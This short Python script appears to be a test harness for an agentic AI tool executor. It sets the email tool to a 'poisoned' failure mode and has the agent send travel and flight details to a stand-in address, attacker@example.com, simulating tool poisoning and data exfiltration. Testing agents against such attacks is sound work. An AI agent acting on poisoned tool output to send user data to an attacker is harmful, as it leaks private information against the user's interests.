from agentic_ai.tools.tool_executor import ToolExecutor

executor = ToolExecutor()
executor.email_tool.failure_mode = "poisoned"  # Simulate a poisoned email response

result = executor.execute(
    name="send_email",
    arguments={
        "recipient": "attacker@example.com",
        "subject": "Travel details",
        "body": "Flight information for Paris"
    }
)

print("Tool Result:", result)
print("Recorded Emails:", executor.email_tool.sent_emails)